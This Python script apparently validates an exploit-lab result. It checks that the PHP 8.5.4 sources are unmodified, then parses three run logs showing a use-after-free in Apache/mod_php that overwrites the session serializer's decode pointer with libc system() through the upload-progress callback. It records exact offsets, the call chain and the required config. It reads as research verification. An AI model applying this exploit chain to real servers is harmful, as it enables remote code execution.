#!/usr/bin/env python3
import os,re,subprocess,tarfile
root='/opt/php-uaf-lab';src=f'{root}/build/php-8.5.4-apache-clean';module=f'{src}/libs/libphp.so';libc='/usr/lib/x86_64-linux-gnu/libc.so.6'
files=['ext/standard/var.c','ext/standard/var_unserializer.c','Zend/zend_hash.c','ext/session/session.c','main/rfc1867.c','main/SAPI.c','main/php_variables.c']
with tarfile.open(f'{root}/src/php-8.5.4.tar.xz') as t:
 for rel in files:assert open(src+'/'+rel,'rb').read()==t.extractfile('php-8.5.4/'+rel).read(),rel
nm=subprocess.check_output(['nm','-an',module],text=True);assert 'bg_hijack' not in nm and 'bg_write_target' not in nm and 'LEAKTRACE' not in open(src+'/ext/standard/var_unserializer.c').read()
ps_off=int(re.search(r'^([0-9a-f]+) d ps_serializers$',nm,re.M).group(1),16);decode_off=int(re.search(r'^([0-9a-f]+) t ps_srlzr_decode_php$',nm,re.M).group(1),16)
libnm=subprocess.check_output(['nm','-D',libc],text=True);system_off=int(re.search(r'^([0-9a-f]+) W system@@GLIBC_2\.2\.5$',libnm,re.M).group(1),16)
s=open(f'{root}/results/bgctx/apache-session-callback-clean-repetitions.txt').read();chunks=[x for x in s.split('RUN=') if x.strip()];assert len(chunks)==3
modules=[];heaps=[];libcs=[]
for n,c in enumerate(chunks,1):
 m=re.search(r'WORKER=(\d+) MODULE_BASE=0x([0-9a-f]+) HEAP=(0x[0-9a-f]+) D_PREDICTED=(0x[0-9a-f]+) D_ACTUAL=(0x[0-9a-f]+) PS_DECODE=(0x[0-9a-f]+) LIBC_BASE=0x([0-9a-f]+) SYSTEM=(0x[0-9a-f]+) USED=(-?\d+)',c);assert m
 worker=int(m.group(1));mb=int(m.group(2),16);heap=int(m.group(3),16);dp=int(m.group(4),16);da=int(m.group(5),16);target=int(m.group(6),16);lb=int(m.group(7),16);system=int(m.group(8),16);used=int(m.group(9));modules.append(mb);heaps.append(heap);libcs.append(lb)
 assert dp==da==heap+0x1c6000 and target==mb+ps_off+0x28 and system==lb+system_off and used<=1017
 assert re.search(r'MARKER=(.*)',c).group(1)==f'APACHE_SESSION_CALLBACK_{n}'
 assert f'WORKER_AFTER={worker}' in c and 'HTTP_200=yes' in c
 assert 'CONTROL=APACHE_SESSION_CALLBACK_HIT system=' in c and f'printf APACHE_SESSION_CALLBACK_{n}>' in c
 for frame in ['__libc_system','php_session_decode','php_session_initialize','php_session_rfc1867_update','php_session_rfc1867_callback','rfc1867_post_handler','sapi_handle_post','php_request_startup']:assert frame in c,frame
 before=bytes.fromhex(re.search(r'BEFORE=([0-9a-f]+)',c).group(1));after=bytes.fromhex(re.search(r'AFTER=([0-9a-f]+)',c).group(1));assert int.from_bytes(before[16:24],'little')==mb+decode_off;assert int.from_bytes(after[16:24],'little')==system
 assert open(f'/tmp/apache-session-callback-marker-{n}').read()==f'APACHE_SESSION_CALLBACK_{n}'
 response=open(f'{root}/results/bgctx/apache-session-callback-clean-response-{n}.txt','rb').read();assert b'HTTP/1.1 200 OK' in response and b'Server: Apache/' in response
assert len(set(modules))==len(set(heaps))==len(set(libcs))==3
load=open('/etc/apache2/mods-enabled/phptrace.load').read();assert module in load
conf=open('/etc/apache2/mods-enabled/phptrace.conf').read();
for required in ['memory_limit 4M','session.upload_progress.cleanup Off','session.serialize_handler php','session.save_path /opt/php-uaf-lab/sessions/apache-clean']:assert required in conf
mpm=open('/etc/apache2/mods-enabled/mpm_prefork.conf').read();assert re.search(r'MaxRequestWorkers\s+1',mpm)
sender=open(f'{root}/bgctx/unserialize-session-callback-apache-final.py').read();assert 'POST /index.php' in sender and '/natural.php' not in sender and "b'cmd'" not in sender
index=open(f'{root}/www-trace/index.php').read();assert index.strip()=='<?php // Silence is golden.'
print(f'VALIDATION=PASS sapi=apache2handler pristine_source_files={len(files)} runs=3 unique_module_heap_libc=3 same_worker=yes sink_symbols=absent natural_target=ps_serializers[1].decode target_offset=0x{ps_off+0x28:x} libc_system_offset=0x{system_off:x} application_function_call=none')
